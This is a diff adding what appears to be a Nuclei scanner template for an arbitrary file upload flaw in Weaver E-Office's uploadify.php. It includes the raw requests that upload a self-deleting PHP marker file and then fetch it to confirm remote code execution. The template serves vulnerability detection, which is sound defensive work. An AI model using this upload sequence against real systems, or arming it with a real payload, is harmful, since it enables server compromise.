@@ -1,0 +1,57 @@
+id: weaver-uploadify-file-upload
+
+info:
+  name: OA E-Office Uploadify - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  description: OA E-Office Uploadify is vulnerable to arbitrary file upload.
+  reference:
+    - https://github.com/w-digital-scanner/w9scan/blob/master/plugins/weaver_oa/2158.py
+  classification:
+    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: weaver
+    product: e-office
+    fofa-query: app="泛微-EOffice"
+  tags: weaver,e-office,oa,intrusive,rce,fileupload
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+  string: "weaver-uploadify-file-upload"
+
+http:
+  - raw:
+      - |
+        GET /general/weibo/javascript/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /general/weibo/javascript/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjetvpuye
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundaryjetvpuye
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
+        ------WebKitFormBoundaryjetvpuye--
+      - |
+        GET /attachment/personal/_temp.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2, 'imageSrc') && contains(body_2, 'height')"
+        condition: and
+
+      - type: word
+        part: body_3
+        words:
+          - '{{md5(string)}}'
+# digest: 4a0a00473045022100d3a165df533cae5a43a1f1004933785451e22dfb38c75382f6aa13bd4a06dc600220580bec1d0f3bdfe7c8e307d475b797c8640195b584e38ca63213a99b277505d2:922c64590222798bb761d5b6d8e72950
